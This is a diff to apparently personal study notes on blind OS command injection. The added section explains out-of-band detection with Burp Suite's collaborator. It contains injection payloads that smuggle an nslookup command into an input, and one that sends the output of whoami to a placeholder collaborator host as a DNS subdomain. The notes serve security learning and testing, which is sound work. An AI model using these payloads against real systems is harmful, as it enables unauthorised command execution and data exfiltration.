@@ -49,6 +49,21 @@
 https://<URL>/whoami.txt
 ```
 
+##### OAST
+
+> Blind injections can also be discovered using out of band techniques, such as performing a [[Domain Name System (DNS)]] lookup of a server we have control over, such as the [[Burp Suite]] collaborator server.
+
+```
+x||nslookup <burp-collab-payalod>||
+```
+> We can get the collaborator payload by right clicking in the repeater and choosing insert collaborator payload.
+> Moreover, we can observe the `nslookup` by checking the collaborator server logs.
+
+> We can append the data we need to extract as a subdomain of the collaborator server.
+```
+x||nslookup `whoami`.<burp-collab-payload>||
+```
+
 ---
 
 ### Useful Commands
